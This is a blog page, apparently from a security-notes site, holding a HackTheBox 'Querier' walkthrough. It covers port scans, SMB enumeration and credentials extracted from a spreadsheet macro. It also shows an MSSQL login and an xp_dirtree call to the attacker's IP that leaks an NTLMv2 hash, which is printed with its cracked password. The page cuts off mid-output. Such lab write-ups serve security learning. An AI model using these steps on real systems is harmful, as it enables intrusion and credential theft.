@@ -1,0 +1,671 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CrazyInSide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="12345678910111213141516171819CrazyInSide:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.125[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Quserier">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Quserier.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="12345678910111213141516171819CrazyInSide:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.125[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-0">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Querier.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830211121272.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.027Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.032Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Querier.png">
+  
+  
+  
+  <title>HTB Walkthrough - Quserier - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Quserier"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          127 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Quserier</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Querier.png" srcset="/img/loading.gif" lazyload alt="Querier"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.125</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-30 12:21:58 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 49665/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 1433/tcp on 10.10.10.125                                  </span><br><span class="line">Discovered open port 49671/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 49668/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 49666/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 49667/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 5985/tcp on 10.10.10.125                                  </span><br><span class="line">Discovered open port 139/tcp on 10.10.10.125                                   </span><br><span class="line">Discovered open port 445/tcp on 10.10.10.125                                   </span><br><span class="line">Discovered open port 49664/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 47001/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 49670/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 49669/tcp on 10.10.10.125                                 </span><br><span class="line">Discovered open port 135/tcp on 10.10.10.125  </span><br></pre></td></tr></table></figure>
+
+<p>高端口一般都是RPC,常用业务端口基本都是1-10000：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.125 -p1433,139,5985,445,135</span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-30 20:37 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.125</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2022-08-30T12:20:16</span><br><span class="line">|_Not valid after:  2052-08-30T12:20:16</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2022-08-30T12:37:35+00:00; 0s from scanner time.</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2022-08-30T12:37:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.67 seconds</span><br><span class="line">zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.125 -p1433,139,5985,445,135</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ smbmap -H 10.10.10.125          </span><br><span class="line">[+] IP: 10.10.10.125:445        Name: 10.10.10.125                                      </span><br><span class="line">                                                                                                                                        </span><br><span class="line">CrazyInSide:~/HackTheBox$ smbclient -N -L //10.10.10.125</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        Reports         Disk      </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                                                                                                                        </span><br><span class="line">CrazyInSide:~/HackTheBox$ smbclient -N -L //10.10.10.125/Reports</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        Reports         Disk      </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                                                                                                                        </span><br><span class="line">CrazyInSide:~/HackTheBox$ smbclient  //10.10.10.125/Reports </span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\crazyinside]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Jan 29 07:23:48 2019</span><br><span class="line">  ..                                  D        0  Tue Jan 29 07:23:48 2019</span><br><span class="line">  Currency Volume Report.xlsm         A    12229  Mon Jan 28 06:21:34 2019</span><br><span class="line"></span><br><span class="line">                6469119 blocks of size 4096. 1615039 blocks available</span><br><span class="line">smb: \&gt; get Currency Volume Report.xlsm </span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Currency</span><br><span class="line">smb: \&gt; get <span class="string">&quot;Currency Volume Report.xlsm&quot;</span></span><br><span class="line">getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (22.6 KiloBytes/sec) (average 22.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure>
+
+<p>文件打开是空的，但是它有宏代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ olevba Currency\ Volume\ Report.xlsm </span><br><span class="line">olevba 0.60.1 on Python 3.10.5 - http://decalage.info/python/oletools</span><br><span class="line">===============================================================================</span><br><span class="line">FILE: Currency Volume Report.xlsm</span><br><span class="line">Type: OpenXML</span><br><span class="line">WARNING  For now, VBA stomping cannot be detected <span class="keyword">for</span> files <span class="keyword">in</span> memory</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO ThisWorkbook.cls </span><br><span class="line"><span class="keyword">in</span> file: xl/vbaProject.bin - OLE stream: <span class="string">&#x27;VBA/ThisWorkbook&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; macro to pull data for client volume reports</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27; further testing required</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Private Sub Connect()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Dim conn As ADODB.Connection</span></span><br><span class="line"><span class="string">Dim rs As ADODB.Recordset</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Set conn = New ADODB.Connection</span></span><br><span class="line"><span class="string">conn.ConnectionString = &quot;Driver=&#123;SQL Server&#125;;Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;</span></span><br><span class="line"><span class="string">conn.ConnectionTimeout = 10</span></span><br><span class="line"><span class="string">conn.Open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If conn.State = adStateOpen Then</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &#x27;</span> MsgBox <span class="string">&quot;connection successful&quot;</span></span><br><span class="line"> </span><br><span class="line">  <span class="string">&#x27;Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)</span></span><br><span class="line"><span class="string">  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)</span></span><br><span class="line"><span class="string">  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs</span></span><br><span class="line"><span class="string">  rs.Close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">End If</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">End Sub</span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">VBA MACRO Sheet1.cls </span></span><br><span class="line"><span class="string">in file: xl/vbaProject.bin - OLE stream: &#x27;</span>VBA/Sheet1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - </span></span><br><span class="line"><span class="string">(empty macro)</span></span><br><span class="line"><span class="string">+----------+--------------------+---------------------------------------------+</span></span><br><span class="line"><span class="string">|Type      |Keyword             |Description                                  |</span></span><br><span class="line"><span class="string">+----------+--------------------+---------------------------------------------+</span></span><br><span class="line"><span class="string">|Suspicious|Open                |May open a file                              |</span></span><br><span class="line"><span class="string">|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |</span></span><br><span class="line"><span class="string">|          |                    |used to obfuscate strings (option --decode to|</span></span><br><span class="line"><span class="string">|          |                    |see all)                                     |</span></span><br><span class="line"><span class="string">+----------+--------------------+---------------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                                                                        </span></span><br><span class="line"><span class="string">CrazyInSide:~/HackTheBox$ </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reporting:PcwTWTHRwryjc<span class="variable">$c6</span></span><br></pre></td></tr></table></figure>
+
+<p>Impacket集合了很多常见的协议服务尤其windows平台的python脚本工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$  mssqlclient.py reporting:<span class="string">&#x27;PcwTWTHRwryjc$c6&#x27;</span>@10.10.10.125 -windows-auth</span><br><span class="line">Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(QUERIER): Line 1: Changed database context to <span class="string">&#x27;volume&#x27;</span>.</span><br><span class="line">[*] INFO(QUERIER): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">     lcd &#123;path&#125;                 - changes the current <span class="built_in">local</span> directory to &#123;path&#125;</span><br><span class="line">     <span class="built_in">exit</span>                       - terminates the server process (and this session)</span><br><span class="line">     enable_xp_cmdshell         - you know what it means</span><br><span class="line">     disable_xp_cmdshell        - you know what it means</span><br><span class="line">     xp_cmdshell &#123;cmd&#125;          - executes cmd using xp_cmdshell</span><br><span class="line">     sp_start_job &#123;cmd&#125;         - executes cmd using the sql server agent (blind)</span><br><span class="line">     ! &#123;cmd&#125;                    - executes a <span class="built_in">local</span> shell cmd</span><br><span class="line">     </span><br><span class="line">SQL&gt; </span><br></pre></td></tr></table></figure>
+
+<p>只要有关目录的地方，windows基本都支持网络路径，涉及网络路径，就可能会引起hash泄露：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_dirtree <span class="string">&#x27;\\10.10.16.2\a&#x27;</span></span><br><span class="line">subdirectory                                                                                                                                                                                                                                                            depth   </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   </span><br><span class="line"></span><br><span class="line">SQL&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.10.125</span><br><span class="line">[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:d5c74d945297b5e0:0D7B58D2A3FBF559E168CA6285971D3A:010100000000000000C68D3AB2BCD801C8DE63E18FDBEFE50000000002000800490036003700490001001E00570049004E002D004F005600570038005A0034005700590049003600560004003400570049004E002D004F005600570038005A003400570059004900360056002E0049003600370049002E004C004F00430041004C000300140049003600370049002E004C004F00430041004C000500140049003600370049002E004C004F00430041004C000700080000C68D3AB2BCD80106000400020000000800300030000000000000000000000000300000CA5AA4559B6B1287813892DB7EC94C5FC1F702608003848806BE4E4A650CD7A60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003200000000000000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSSQL-SVC::QUERIER:d5c74d945297b5e0:0d7b58d2a3fbf559e168ca6285971d3a:010100000000000000c68d3ab2bcd801c8de63e18fdbefe50000000002000800490036003700490001001e00570049004e002d004f005600570038005a0034005700590049003600560004003400570049004e002d004f005600570038005a003400570059004900360056002e0049003600370049002e004c004f00430041004c000300140049003600370049002e004c004f00430041004c000500140049003600370049002e004c004f00430041004c000700080000c68d3ab2bcd80106000400020000000800300030000000000000000000000000300000ca5aa4559b6b1287813892db7ec94c5fc1f702608003848806be4e4a650cd7a60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000:corporate568</span><br></pre></td></tr></table></figure>
+
+<p>可以用新凭证链接mssql:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ mssqlclient.py mssql-svc:<span class="string">&#x27;corporate568&#x27;</span>@10.10.10.125 -windows-auth</span><br><span class="line">Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(QUERIER): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(QUERIER): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; SELECT * FROM fn_my_permissions(NULL, <span class="string">&#x27;SERVER&#x27;</span>);</span><br><span class="line">entity_name     subentity_name     permission_name</span><br><span class="line">-------------   ----------------   --------------------------------</span><br><span class="line">server                             